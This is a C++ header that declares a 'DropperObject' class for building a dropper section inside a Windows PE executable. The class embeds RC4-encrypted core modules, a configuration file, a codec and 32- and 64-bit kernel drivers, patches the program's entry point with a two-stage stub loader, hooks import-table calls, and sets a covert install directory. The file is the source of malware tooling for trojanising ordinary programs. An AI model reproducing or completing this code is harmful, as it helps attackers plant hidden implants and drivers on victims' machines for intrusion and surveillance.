#ifndef _DROPPER_SECTION_H
#define _DROPPER_SECTION_H

#include <list>
#include <map>
#include <string>

#include <boost/shared_array.hpp>

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include "common.h"
#include "DropperCode.h"

typedef struct _patch_t {
	DWORD VA;
	boost::shared_array<char> buffer;
	DWORD size;
} PatchBuffer;

typedef struct _file_buffer {
	std::string name;
	boost::shared_array<char> buffer;
	DWORD size;
} NamedFileBuffer;

class PEObject;

class DropperObject
{
private:
	boost::shared_array<char> _data;
	std::size_t _size;
	std::size_t _epOffset;
	
	DWORD VA;
	PEObject& _pe;
	
	std::string _installDir;
	std::list<std::string> _strings;
	std::map < std::string, int > _hookedCalls;
	
	struct {
		NamedFileBuffer core;
		NamedFileBuffer core64;
		NamedFileBuffer config;
		NamedFileBuffer driver;
		NamedFileBuffer driver64;
		NamedFileBuffer codec;
	} _files;
	
	PatchBuffer _patches[2]; // patch buffers for 2 stages of stub loader
	
	bool _readFile(std::string path, NamedFileBuffer& buffer);
	char* _embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr );
	int _embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr );
	
	void _setExecutableName(std::string name) 
	{ 
		std::list< std::string >::iterator iter = _strings.begin();
		_strings.insert(iter, name); 
	}

	void _setInstallDir(std::string path) 
	{ 
		std::list< std::string >::iterator iter = _strings.begin();
		iter++;
		_strings.insert(iter, path);
	}
	
	bool _addCoreFile(std::string path, std::string name);
	bool _addCore64File(std::string path, std::string name);
	bool _addConfigFile(std::string path, std::string name);
	bool _addCodecFile(std::string path, std::string name);
	bool _addDriverFile(std::string path, std::string name);
	bool _addDriver64File(std::string path, std::string name);
	
	int _getIATCallIndex(std::string dll, std::string call);
	
	DWORD _build(WINSTARTFUNC OriginalEntryPoint);

public:
	DropperObject(PEObject& pe);
	
	bool build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir);
	
	char* getRestoreStub() 
	{ 
		DataSectionHeader* header = (DataSectionHeader*)_data.get();
		return ( _data.get() + header->restore.offset );
	}

	std::size_t restoreStubOffset() 
	{ 
		DataSectionHeader* header = (DataSectionHeader*)_data.get();
		return ( header->restore.offset );
	}
	
	void setPatchCode(std::size_t idx, DWORD VA, char const * const data, std::size_t size);
	
	char const * const data() { return _data.get(); }
	std::size_t const size() { return _size; }
	std::size_t epOffset() { return _epOffset; }

};

#endif /* _DROPPER_SECTION_H */
